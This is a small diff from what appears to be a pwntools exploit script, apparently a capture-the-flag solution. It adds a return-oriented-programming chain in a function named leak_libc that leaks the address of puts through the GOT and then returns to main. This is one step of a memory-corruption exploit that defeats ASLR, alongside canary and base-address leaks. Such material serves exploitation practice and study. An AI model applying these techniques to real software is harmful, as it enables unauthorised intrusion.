@@ -61,7 +61,7 @@ def leak_base(p,e,r, canary):
 
 def leak_libc(p, e, r, canary, base_addr):
     pad = b"A" * 10
-    #hain = p64( 
+    chain = p64(r.find_gadget(["pop rdi", "ret"])[0]) + p64(e.got["puts"]) + p64(e.plt["puts"]) + p64(e.sym["main"])
 
     log.info("Leaking libc")
     pause()
